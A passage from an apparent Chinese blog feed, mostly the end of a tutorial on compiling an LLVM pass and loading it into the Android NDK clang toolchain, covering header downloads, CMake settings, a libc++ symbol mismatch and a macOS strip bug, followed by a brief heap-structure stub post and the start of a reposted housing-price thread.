<li>第一个方案是找到源码并使用cmake帮我们提取一遍。</li>
<li>第二个方案是直接使用aosp提供的prebuilt文件，显然为了方便我们选择后者。<br>toolchain 在生成时会有一份描述版本信息的文件，在ndk生成时也被拷贝过来了<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  linux-x86_64 cat /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/AndroidVersion.txt </span><br><span class="line">8.0.7</span><br><span class="line">based on r346389c</span><br></pre></td></tr></table></figure>
<strong>【AOSP相关访问google的前提条件你懂的】</strong></li>
</ul>
<p><code>r346389c</code> 就是这份toolchain的唯一标识，它与出现在 <a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/</a> 中的一系列clang-rxxxx是一回事，由于这个README.md经常被更新，我们需要checkout到对应的tag才可以找到它，<a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/refs/tags/ndk-r20%E3%80%82">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/refs/tags/ndk-r20。</a></p>
<p>于是在 <a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/refs/tags/ndk-r20/clang-r346389c/include/">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/refs/tags/ndk-r20/clang-r346389c/include/</a> 中我们非常轻易就获取到了那份编译时刻的 <code>include/llvm</code> 和 <code>include/llvm-c</code> 文件，使用点击右上角的 tgz ，有用的只有 <code>llvm</code> 和 <code>llvm-c</code> ，另外的 <code>clang</code> 、<code>clang-c</code> 、<code>lld</code> 我们用不到我就不下载了。</p>
<p><a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/llvm.tar.gz">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/llvm.tar.gz</a></p>
<p><a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/llvm-c.tar.gz">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/llvm-c.tar.gz</a></p>
<p>即可获得到这个目录的压缩包。</p>
<p>mac 对应的目录是<br><a href="https://android.googlesource.com/platform/prebuilts/clang/host/darwin-x86/+/refs/tags/ndk-r20/clang-r346389c/include/">https://android.googlesource.com/platform/prebuilts/clang/host/darwin-x86/+/refs/tags/ndk-r20/clang-r346389c/include/</a></p>
<p>如果可以接受NDK被污染（我使用的是这个方案），可以将它放到NDK的toolchain中，这样就可以继续使用 <code>$&#123;LLVM_INCLUDE_DIRS&#125; </code>这个变量；</p>
<p>如果不能接受NDK被污染，就随便放个目录，使用 <code>include_directories(/path/to/clang-r346389c/include)</code></p>
<p>比如放在NDK里的include里，是这个样子（c++目录本来就有）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  include lsa</span><br><span class="line">total 5.4M</span><br><span class="line">drwxr-xr-x  8 leadroyal leadroyal 4.0K Oct 21 02:13 .</span><br><span class="line">drwxr-xr-x 15 leadroyal leadroyal 4.0K Oct 20 23:16 ..</span><br><span class="line">drwxr-xr-x  4 leadroyal leadroyal 4.0K Oct 21 02:12 c++</span><br><span class="line">drwxr-xr-x 33 leadroyal leadroyal 4.0K Oct 21 02:12 llvm</span><br><span class="line">drwxr-xr-x  3 leadroyal leadroyal 4.0K Oct 21 02:12 llvm-c</span><br></pre></td></tr></table></figure>
<p>然后有几率遇到C++版本的问题，llvm10以上需要添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(CMAKE_CXX_STANDARD 14)</span><br></pre></td></tr></table></figure>
<p>在这在情况下使用的CMakeLists.txt最终是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4)</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_HOME&#125;)</span><br><span class="line">    message(FATAL_ERROR &quot;$LLVM_HOME is not defined&quot;)</span><br><span class="line">endif()</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_DIR&#125;)</span><br><span class="line">    set(ENV&#123;LLVM_DIR&#125; $ENV&#123;LLVM_HOME&#125;/lib64/cmake/llvm)</span><br><span class="line">endif()</span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CXX_STANDARD 14)</span><br><span class="line">add_subdirectory(skeleton)  # Use your pass name here.</span><br></pre></td></tr></table></figure>
<p>修复完include问题后，就可以舒舒服服地使用cmake来生成demo了，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LLVM_HOME=/home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64</span><br><span class="line">➜  b git:(master) ✗ cmake ..       </span><br><span class="line">-- The C compiler identification is GNU 7.4.0</span><br><span class="line">-- The CXX compiler identification is GNU 7.4.0</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc</span><br><span class="line">-- Check for working C compiler: /usr/bin/cc -- works</span><br><span class="line">-- Detecting C compiler ABI info</span><br><span class="line">-- Detecting C compiler ABI info - done</span><br><span class="line">-- Detecting C compile features</span><br><span class="line">-- Detecting C compile features - done</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++</span><br><span class="line">-- Check for working CXX compiler: /usr/bin/c++ -- works</span><br><span class="line">-- Detecting CXX compiler ABI info</span><br><span class="line">-- Detecting CXX compiler ABI info - done</span><br><span class="line">-- Detecting CXX compile features</span><br><span class="line">-- Detecting CXX compile features - done</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">-- Build files have been written to: /home/leadroyal/llvm-pass-tutorial/b</span><br><span class="line">➜  b git:(master) ✗ cmake --build .                    </span><br><span class="line">Scanning dependencies of target SkeletonPass</span><br><span class="line">[ 50%] Building CXX object skeleton/CMakeFiles/SkeletonPass.dir/Skeleton.cpp.o</span><br><span class="line">[100%] Linking CXX shared module libSkeletonPass.so</span><br><span class="line">[100%] Built target SkeletonPass</span><br></pre></td></tr></table></figure>

<h1 id="三、使用NDK的环境加载一个pass"><a href="#三、使用NDK的环境加载一个pass" class="headerlink" title="三、使用NDK的环境加载一个pass"></a>三、使用NDK的环境加载一个pass</h1><p>编译部分完成了，接下来是加载部分，我们随便找一个android native项目，修改build.gradle中的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">    cmake &#123;</span><br><span class="line">        cppFlags &quot;-Xclang -load -Xclang /home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>gradle build</code> 命令后，可能会如下报错（当编译pass时使用了GNU系列的c++时候会遇到，常见于ubuntu，因为NDK使用的是llvm系列的c++）<br>如果出现如下报错的话，解决方案如下，如果没有报错，请跳过这部分</p>
<p>通常被搜索的关键词是：<code>_ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE</code></p>
<p><strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;GNU使用兼容libc++的方案（没遇到可以跳过） &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gradlew build</span><br><span class="line">  error: unable to load plugin &#x27;/home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so&#x27;: &#x27;/home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so: undefined symbol: _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE&#x27;</span><br></pre></td></tr></table></figure>
<p>很奇怪，提醒这个符号找不到，但是我们编译时能找到、连接时找不到，就很奇怪。</p>
<p>demangle一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c++filt _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE</span><br><span class="line">llvm::FunctionPass::createPrinterPass(llvm::raw_ostream&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) const</span><br></pre></td></tr></table></figure>
<p>去NDK的相关目录下grep，发现了该符号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  lib64 pwd</span><br><span class="line">/home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/lib64</span><br><span class="line">➜  lib64 strings * | grep _ZNK4llvm12FunctionPass17createPrinterPass</span><br><span class="line">strings: Warning: &#x27;clang&#x27; is a directory</span><br><span class="line">strings: Warning: &#x27;cmake&#x27; is a directory</span><br><span class="line">_ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEE</span><br></pre></td></tr></table></figure>
<p>demangle一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c++filt _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEE</span><br><span class="line">llvm::FunctionPass::createPrinterPass(llvm::raw_ostream&amp;, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;) const</span><br></pre></td></tr></table></figure>
<p>对比一下二者，注意一个细节，参数命名空间不一致：<br>NDK里的叫 <code>std::__1::basic_string</code> ，我们编出来的叫 <code>std::__cxx11::basic_string</code></p>
<p>NDK里的叫 <code>std::__1::char_traits</code> ，我们编出来的叫 <code>std::char_traits</code></p>
<p>如果是老司机的话，一眼就知道它们使用了不同版本的c++，最初的源码是一致的，解决起来不难。</p>
<p>用 <code>__cxx11</code> 的叫 <code>libc++</code>，用 <code>__1</code> 叫 <code>libstdc++</code>。</p>
<p>解决方案是在连接时使用 <code>libc++</code> ，<code>set(CMAKE_CXX_FLAGS &quot;$&#123;CMAKE_CXX_FLAGS&#125; -stdlib=libc++&quot;)</code> ，但由于ubuntu装的一般是gcc系列，而gcc系列是没有libc++的，编译会crash如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=/usr/bin/c++</span><br><span class="line">OFFLOAD_TARGET_NAMES=nvptx-none</span><br><span class="line">OFFLOAD_TARGET_DEFAULT=1</span><br><span class="line">c++: error: unrecognized command line option ‘-stdlib=libc++’</span><br></pre></td></tr></table></figure>
<p>gcc没有libc++，只有llvm系列拥有libc++，所以需要将编译器切换到clang。</p>
<p>重申我们之前的原则：不需要安装额外的软件，恰好NDK提供了一个clang给我们，为了方便我就用它提供的了（毕竟安装一个clang也挺麻烦的）</p>
<p>再使用libc++的头文件，也直接从对应的地方下载，但千万别和NDK的放在一起，因为 <code>libc++</code> 的 <code>c++/v11</code> 和NDK的 <code>c++/4.9.x</code>，放一起会冲突<br><a href="https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/c++.tar.gz">https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/tags/ndk-r20/clang-r346389c/include/c++.tar.gz</a></p>
<p>我把libc++的头文件放在 <code>/home/leadroyal/Android/Sdk/r346389c/include/</code> 下</p>
<p>放好后对它进行include，在这在情况下使用的CMakeLists.txt最终是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4)</span><br><span class="line">set(CMAKE_C_COMPILER /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/bin/clang)</span><br><span class="line">set(CMAKE_CXX_COMPILER /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/bin/clang++)</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_HOME&#125;)</span><br><span class="line">    message(FATAL_ERROR &quot;$LLVM_HOME is not defined&quot;)</span><br><span class="line">endif()</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_DIR&#125;)</span><br><span class="line">    set(ENV&#123;LLVM_DIR&#125; $ENV&#123;LLVM_HOME&#125;/lib64/cmake/llvm)</span><br><span class="line">endif()</span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">include_directories(/home/leadroyal/Android/Sdk/r346389c/include/c++/v1)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CXX_STANDARD 14)</span><br><span class="line">set(CMAKE_CXX_FLAGS &quot;$&#123;CMAKE_CXX_FLAGS&#125; -stdlib=libc++&quot;)</span><br><span class="line">add_subdirectory(skeleton)  # Use your pass name here.</span><br></pre></td></tr></table></figure>
<p>我们使用gcc和clang编译两份pass出来，对比一下前后的区别：</p>
<p>使用GCC编译出来的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  b git:(master) ✗ ldd skeleton/libSkeletonPass.so</span><br><span class="line">    linux-vdso.so.1 (0x00007ffc3c3d5000)</span><br><span class="line">    libstdc++.so.6 =&gt; /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007ff114c76000)</span><br><span class="line">    libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007ff114a5e000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff11466d000)</span><br><span class="line">    libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007ff1142cf000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007ff115205000)</span><br></pre></td></tr></table></figure>
<p>使用clang编译出来的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  b git:(master) ✗ ldd skeleton/libSkeletonPass.so</span><br><span class="line">    linux-vdso.so.1 (0x00007ffc369e2000)</span><br><span class="line">    libc++.so.1 =&gt; not found</span><br><span class="line">    libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f002042c000)</span><br><span class="line">    libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f0020214000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f001fe23000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f00209d3000)</span><br></pre></td></tr></table></figure>
<p>虽然后者提醒libc++.so.1找不到，感觉很诧异，于是去查ndk clang的依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  bin ldd /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/bin/clang</span><br><span class="line">    linux-vdso.so.1 (0x00007ffc99bc7000)</span><br><span class="line">    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f3bb9d24000)</span><br><span class="line">    libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007f3bb9b07000)</span><br><span class="line">    librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007f3bb98ff000)</span><br><span class="line">    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f3bb96fb000)</span><br><span class="line">    libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f3bb935d000)</span><br><span class="line">    libc++.so.1 =&gt; /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/bin/../lib64/libc++.so.1 (0x00007f3bba07e000)</span><br><span class="line">    libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f3bb9145000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3bb8d54000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f3bb9f43000)</span><br></pre></td></tr></table></figure>
<p>发现在NDK里确实存在libc++.so.1环境，问题解决，我们回归主题，最后一步，使用NDK加载它！</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;GNU使用兼容libc++的方案 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>我们先用简单的c文件验证我们的pass，没有任何问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  /tmp cat test.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">printf(&quot;HelloWorld\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">➜  /tmp /home/leadroyal/Android/Sdk/ndk/20.0.5594570/toolchains/llvm/prebuilt/linux-x86_64/bin/clang -Xclang -load -Xclang /home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so test.c </span><br><span class="line">I saw a function called main!</span><br><span class="line">➜  /tmp ./a.out </span><br><span class="line">HelloWorld</span><br></pre></td></tr></table></figure>
<p>最后一步，见证奇迹的时刻！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  MyApplication ./gradlew clean build</span><br><span class="line">............</span><br><span class="line">&gt; Task :app:externalNativeBuildDebug</span><br><span class="line">Build native-lib_armeabi-v7a</span><br><span class="line">ninja: Entering directory `/home/leadroyal/AndroidStudioProjects/MyApplication/app/.cxx/cmake/debug/armeabi-v7a&#x27;</span><br><span class="line">[1/2] Building CXX object CMakeFiles/native-lib.dir/native-lib.cpp.o</span><br><span class="line">I saw a function called Java_com_example_myapplication_MainActivity_stringFromJNI!</span><br><span class="line">I saw a function called _ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2EPKc!</span><br><span class="line">I saw a function called _ZN7_JNIEnv12NewStringUTFEPKc!</span><br><span class="line">I saw a function called _ZNKSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5c_strEv!</span><br><span class="line">I saw a function called _ZNSt6__ndk112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev!</span><br></pre></td></tr></table></figure>
<p>泪流满面！我们终于成功编译并且加载了这个Pass!</p>
<h1 id="四、当我们来到macOS上"><a href="#四、当我们来到macOS上" class="headerlink" title="四、当我们来到macOS上"></a>四、当我们来到macOS上</h1><p>同Linux一样，先修复cmake文件，再下载include&#x2F;llvm和incude&#x2F;llvm-c，因为macOS默认就是clang了，所以不会存在libstdc++和libc++冲突的问题，编译过程全程没有任何障碍。</p>
<p>但是在加载时却遇到了如下的错误，也是在网上经常被贴出来问问题的报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  /tmp $ANDROID_NDK/20.0.5594570/toolchains/llvm/prebuilt/darwin-x86_64/bin/clang -Xclang -load -Xclang /home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so test.c</span><br><span class="line">error: unable to load plugin &#x27;/home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so&#x27;:</span><br><span class="line">      &#x27;dlopen(/home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so, 9): Symbol not found:</span><br><span class="line">      __ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE</span><br><span class="line">  Referenced from: /home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so</span><br><span class="line">  Expected in: flat namespace</span><br><span class="line"> in /home/leadroyal/llvm-pass-tutorial/b/skeleton/libSkeletonPass.so&#x27;</span><br></pre></td></tr></table></figure>
<p>demangle一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c++filt __ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE</span><br><span class="line">llvm::FunctionPass::assignPassManager(llvm::PMStack&amp;, llvm::PassManagerType)</span><br></pre></td></tr></table></figure>
<p>这个符号是llvm中导出的符号，供开发者调用，libSkeletonPass.so需要该符号，但是clang的进程空间里没有这个符号。</p>
<p>经过仔细对照，发现不仅仅缺失这一个符号，缺失的是一大堆相关的符号，而且都是较为基础的符号，只是最先被寻找的是这个就停下来了。<br>【先剧透一下，这个符号缺失是apple基础工具的bug，但是google没有发现这个bug，已报告<a href="https://issuetracker.google.com/issues/143160164%E3%80%91">https://issuetracker.google.com/issues/143160164】</a></p>
<p>这时有另一个线索：我们自己编译出来的pass是可以正常加载pass的，一定是AOSP动了手脚，这里省去大量的diff时间，直接说结果。</p>
<p>记作X：使用llvm默认配置（与Android无关）编译出来的clang，可以找到符号</p>
<p>记作Y：使用AOSP得到的stage2-install&#x2F;bin&#x2F;clang，可以找到符号</p>
<p>记作Z：使用AOSP得到的toolchain中的clang，无法找到符号</p>
<p>X&#x2F;Y 可以说明， <a href="https://android.googlesource.com/toolchain/llvm_android/">https://android.googlesource.com/toolchain/llvm_android/</a> 中对llvm的编译配置，是不影响符号的<br>Y&#x2F;Z 可以说明，strip前和strip后会导致符号缺失。在ubuntu上符号仍然被保留，在macOS上符号会消失。</p>
<p>代码如下 <a href="https://android.googlesource.com/toolchain/llvm_android/+/refs/heads/master/build.py">https://android.googlesource.com/toolchain/llvm_android/+/refs/heads/master/build.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for bin_filename in os.listdir(bin_dir):</span><br><span class="line">        binary = os.path.join(bin_dir, bin_filename)</span><br><span class="line">        if os.path.isfile(binary):</span><br><span class="line">            if bin_filename not in necessary_bin_files:</span><br><span class="line">                remove(binary)</span><br><span class="line">            elif strip and bin_filename not in script_bins:</span><br><span class="line">                check_call([&#x27;strip&#x27;, binary])</span><br></pre></td></tr></table></figure>
<p>之后我将X进行 <code>/usr/bin/strip</code> ，发现仍然可以加载pass，这时就开始犯晕，开始缺乏思路。</p>
<p>于是出现了另一个可能引发问题的原因：我编译X、strip-X都是在CommandLineTools 10.15上完成的，但编译Y、strip-Y是在CommandLineTools 10.13上完成的，二者的strip不完全一致！</p>
<p>经过最后一个实验，发现低版本的&#x2F;usr&#x2F;bin&#x2F;strip会错误地移除掉很多符号，导致加载失败，日志如下，我分别用10.13&#x2F;10.14&#x2F;10.15的strip去处理stage2-install&#x2F;bin&#x2F;clang文件，发现10.13&#x2F;14处理出来的文件是错误的。</p>
<img src="/2020/03/07/%E5%8F%B2%E4%B8%8A%E6%9C%80%E4%BC%98%E9%9B%85%E7%9A%84NDK%E5%8A%A0%E8%BD%BDpass%E6%96%B9%E6%A1%88/2020-03-07-00-33-38.png" class="">

<p>至此，真相大白，失败的原因是：AOSP在编译NDK时触发了macOS自带的strip的bug。</p>
<p>最后的挣扎：NDK中存在一个完备的、拥有符号的文件 LLVM.dylib 中的，如果我们让libSkeleton.so依赖它，从LLVM.dylib中获取符号会怎样？<br>最终结果是，关键变量PassManager在NDK-clang中是没有符号的，虽然在LLVM.dylib中可以找到，但二者已经完全不是同一个instance了。</p>
<p>因此，macOS宣告失败，等将来AOSP把这个bug修掉，就可以复用史上最优雅的方法了。</p>
<h1 id="五、当我们来到Windows"><a href="#五、当我们来到Windows" class="headerlink" title="五、当我们来到Windows"></a>五、当我们来到Windows</h1><p>对不起，能力有限告辞。。。</p>
<h1 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h1><p>不想看到的事情：</p>
<p>根据这次commit，开发者建议砍掉toolchain里的.cmake文件，因为作者已经砍掉.a文件了，防止.cmake加载失败引起的误会。我也是弄完这一系列才看到这条commit，于是想尽自己的绵薄之力回滚一下，希望能成功吧。</p>
<p><a href="https://android.googlesource.com/toolchain/llvm_android/+/5e612035111cb9f4abad43697350d4ea644fce33">https://android.googlesource.com/toolchain/llvm_android/+/5e612035111cb9f4abad43697350d4ea644fce33</a><br><a href="https://android-review.googlesource.com/c/toolchain/llvm_android/+/1139155">https://android-review.googlesource.com/c/toolchain/llvm_android/+/1139155</a><br>以及，开发者建议砍掉ndk里的.cmake文件，体现在这次commit里</p>
<p><a href="https://android-review.googlesource.com/c/platform/ndk/+/1137192">https://android-review.googlesource.com/c/platform/ndk/+/1137192</a><br>反正ndk-r21肯定是没有cmake了，到时候就从toolchain里下载回来吧。</p>
<p>本文介绍了一种非常优雅的NDK加载Pass方案，目前从未听说国内外有人使用该方案，感觉非常有意义，在此分享出来，希望更多人可以用到它、共同推动安全行业的发展，完结撒花~</p>
<p>参考链接：<a href="https://leadroyal.cn/">https://leadroyal.cn</a></p>
]]></content>
      <categories>
        <category>OLLVM</category>
      </categories>
      <tags>
        <tag>OLLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出利用</title>
    <url>/2022/05/10/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="堆的数据结构和管理策略"><a href="#堆的数据结构和管理策略" class="headerlink" title="堆的数据结构和管理策略"></a>堆的数据结构和管理策略</h1><h2 id="空表"><a href="#空表" class="headerlink" title="空表"></a>空表</h2><p>空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128条。</p>
<h2 id="块表"><a href="#块表" class="headerlink" title="块表"></a>块表</h2>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>0day安全：软件漏洞分析技术</tag>
      </tags>
  </entry>
  <entry>
    <title>天涯kkndme神贴聊房价</title>
    <url>/2020/04/21/%E5%A4%A9%E6%B6%AFkkndme%E7%A5%9E%E8%B4%B4%E8%81%8A%E6%88%BF%E4%BB%B7/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://github.com/shenzhengfang/kkndme_tianya/blob/master/README.md">https://github.com/shenzhengfang/kkndme_tianya/blob/master/README.md</a></p>
</blockquote>
<h1 id="kkndme-tianya（持续更新中…）"><a href="#kkndme-tianya（持续更新中…）" class="headerlink" title="kkndme_tianya（持续更新中…）"></a>kkndme_tianya（持续更新中…）</h1><blockquote>
<p>天涯神贴<a href="http://bbs.tianya.cn/post-house-252774-1.shtml">「2010年的房地产调控，我们收获了什么？写在房价暴涨前」</a>脱水版，内容时间顺序和原贴保持一致，原贴中的优质非楼主写的内容，添加了引用格式便于区分。</p>
<p>「2010年的房地产调控，我们收获了什么？写在房价暴涨前」里面写的内容，相信每一个站在 2019 年的我们看过后都会觉得怎么没有早点看到这个帖子。</p>
<p><strong>欢迎关注微信公众号：沈正方</strong>，我会在我的<strong>个人微信公众号「沈正方」</strong> 里写一些我对这篇帖子内容的思考，欢迎一起讨论。</p>
</blockquote>
<ul>
<li><a href="#%E6%88%BF%E5%9C%B0%E4%BA%A7%E8%B0%83%E6%8E%A7%E8%A1%A8%E9%9D%A2%E4%B8%8A%E7%9C%8B%E8%B5%B7%E6%9D%A5%E7%9A%84%E7%90%86%E7%94%B1%E6%9C%89%E4%B8%89%E6%9D%A1">房地产调控表面上看起来的理由有三条</a><ul>
<li><a href="#1%E4%BA%BA%E4%BA%BA%E9%83%BD%E6%9C%89%E5%B1%85%E4%BD%8F%E6%9D%83">1、人人都有居住权</a></li>
<li><a href="#2%E6%88%BF%E5%AD%90%E6%98%AF%E7%94%A8%E6%9D%A5%E4%BD%8F%E7%9A%84%E4%B8%8D%E6%98%AF%E7%94%A8%E6%9D%A5%E7%82%92%E7%9A%84">2、房子是用来住的，不是用来炒的</a></li>
<li><a href="#3%E6%88%BF%E5%AD%90%E5%A4%AA%E8%B4%B5%E4%BA%86">3、房子太贵了</a><ul>
<li><a href="#%E6%9C%80%E8%A2%AB%E6%8F%90%E5%8F%8A%E4%B8%8E%E6%B3%A1%E6%B2%AB%E6%9C%89%E5%85%B3%E7%9A%84%E6%98%AF%E4%BB%A5%E4%B8%8B%E4%B8%A4%E7%82%B9">最被提及与泡沫有关的是以下两点：</a><ul>
<li><a href="#%E7%AC%AC%E4%B8%80%E4%B8%AD%E5%9B%BD%E7%9A%84%E6%88%BF%E4%BB%B7%E7%94%9A%E8%87%B3%E9%AB%98%E4%BA%8E%E6%9F%90%E4%BA%9B%E5%8F%91%E8%BE%BE%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%88%BF%E4%BB%B7">第一：中国的房价甚至高于某些发达国家的房价。</a></li>
<li><a href="#%E7%AC%AC%E4%BA%8C%E7%A7%9F%E5%94%AE%E6%AF%94%E4%B8%A5%E9%87%8D%E4%B8%8D%E5%90%88%E7%90%86%E7%A9%BA%E7%BD%AE%E7%8E%87%E5%A4%AA%E9%AB%98%E4%BA%BA%E5%9D%87%E6%94%B6%E5%85%A5%E5%A4%AA%E4%BD%8E%E6%97%A9%E6%99%9A%E8%A6%81%E5%B4%A9%E7%9B%98">第二：租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。</a></li>
</ul>
</li>
</ul>
</li>
